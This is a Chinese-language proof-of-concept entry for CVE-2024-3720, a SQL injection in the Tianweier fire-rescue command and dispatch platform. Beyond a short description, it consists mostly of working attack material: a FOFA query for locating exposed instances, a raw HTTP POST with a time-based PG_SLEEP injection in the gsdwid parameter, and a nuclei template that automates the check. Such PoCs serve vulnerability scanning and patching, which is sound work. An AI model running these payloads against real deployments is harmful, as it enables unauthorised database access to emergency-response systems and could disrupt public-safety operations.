**漏洞名称**

天维尔消防救援作战调度平台 SQL注入漏洞

**漏洞影响**

天维尔消防救援作战调度平台 V1.1.1.1版本

**漏洞描述**

天维消防智能指挥平台是一个采用先进的信息技术和通信技术的系统，能够快速准确地获取和处理突发事件的信息，实现对灾害现场的实时监控和指挥调度，有效提升应急救援工作的能力和水平。天维消防智能指挥平台1.1.1.1存在一个漏洞，影响组件API接口中/mfsNotice/page文件的未知代码。通过操纵参数gsdwid可以导致SQL注入。

**FOFA搜索语句**

```
body="天维尔信息科技股份有限公司" && title=="登入"
```

**漏洞复现**

```yaml

POST /twms-service-mfs/mfsNotice/page HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Connection: close
 
{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930') AND 7120=(SELECT 7120 FROM PG_SLEEP(5)) AND ('dZAi'='dZAi"},"hgubmt748n4":"="}
```

**nuclei poc**

```yaml
id: CVE-2024-3720

info:
  name: 天维尔消防救援作战调度平台SQL注入漏洞
  author: fgz
  severity: high
  description: '天维消防智能指挥平台是一个采用先进的信息技术和通信技术的系统，能够快速准确地获取和处理突发事件的信息，实现对灾害现场的实时监控和指挥调度，有效提升应急救援工作的能力和水平。天维消防智能指挥平台1.1.1.1存在一个漏洞，影响组件API接口中/mfsNotice/page文件的未知代码。通过操纵参数gsdwid可以导致SQL注入。'
  tags: 2024,sqli
  metadata:
    max-request: 1
    fofa-query: body="天维尔信息科技股份有限公司" && title=="登入"
    verified: true


requests:
  - raw:
      - |-
        POST /twms-service-mfs/mfsNotice/page HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 106
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Origin: http://{{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/twms-service-mfs/mfsNotice/page
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
        Connection: close
        
        {"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930') AND 7120=(SELECT 7120 FROM PG_SLEEP(5)) AND ('dZAi'='dZAi"},"hgubmt748n4":"="}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && duration>=5 && duration<=8 && contains(body,'请求成功')"
```

